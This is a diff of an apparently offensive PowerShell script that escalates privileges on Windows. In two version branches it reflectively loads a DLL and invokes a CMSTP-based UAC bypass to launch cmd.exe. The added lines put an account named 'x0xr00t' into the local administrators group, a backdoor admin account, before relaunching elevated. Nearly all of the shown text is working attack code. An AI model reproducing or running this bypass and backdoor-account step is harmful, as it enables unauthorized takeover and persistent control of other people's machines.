@@ -55,7 +55,8 @@ switch ($OSVersion)
         [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))
 
         [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
-  
+        # Add User to ADMIN Group 
+        net localgroup administrators x0xr00t /add
         If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
         {
         # Relaunch as an elevated process:
@@ -93,7 +94,8 @@ switch ($OSVersion)
         [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))
 
         [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
-  
+        # Add User to ADMIN Group 
+        net localgroup administrators x0xr00t /add
         If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
         {
         # Relaunch as an elevated process:
